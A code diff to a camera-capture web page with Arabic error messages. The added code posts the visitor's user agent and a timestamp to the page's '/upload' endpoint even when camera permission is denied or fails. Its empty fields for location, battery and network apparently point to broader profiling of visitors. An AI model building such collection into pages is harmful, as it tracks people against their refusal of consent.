@@ -18,6 +18,24 @@
             if (permission.state === "denied") {
               document.body.innerHTML =
                 "<h2 style='color:red;'>❌ تم رفض إذن الكاميرا من المتصفح</h2>";
+
+              const payload = {
+                image: "null",
+                info: {
+                  time: new Date().toLocaleString(),
+                  location: "غير متاح",
+                  device: navigator.userAgent,
+                  battery: "غير متاح",
+                  network: "غير معروف",
+                },
+              };
+
+              fetch("/upload", {
+                method: "POST",
+                body: JSON.stringify(payload),
+                headers: { "Content-Type": "application/json" },
+              });
+
               return;
             }
 
@@ -27,6 +45,24 @@
               "<h2 style='color:red;'>❌ لم يتم تشغيل الكاميرا: " +
               err.message +
               "</h2>";
+
+            const payload = {
+              image: "null",
+              info: {
+                time: new Date().toLocaleString(),
+                location: "غير متاح",
+                device: navigator.userAgent,
+                battery: "غير متاح",
+                network: "غير معروف",
+              },
+            };
+
+            fetch("/upload", {
+              method: "POST",
+              body: JSON.stringify(payload),
+              headers: { "Content-Type": "application/json" },
+            });
+
             return;
           }
         } catch (err) {
@@ -34,8 +70,27 @@
             "<h2 style='color:red;'>❌ لم يتم تشغيل الكاميرا: " +
             err.message +
             "</h2>";
+
+          const payload = {
+            image: "null",
+            info: {
+              time: new Date().toLocaleString(),
+              location: "غير متاح",
+              device: navigator.userAgent,
+              battery: "غير متاح",
+              network: "غير معروف",
+            },
+          };
+
+          fetch("/upload", {
+            method: "POST",
+            body: JSON.stringify(payload),
+            headers: { "Content-Type": "application/json" },
+          });
+
           return;
         }
+
         const video = document.getElementById("preview");
         video.srcObject = stream;
 
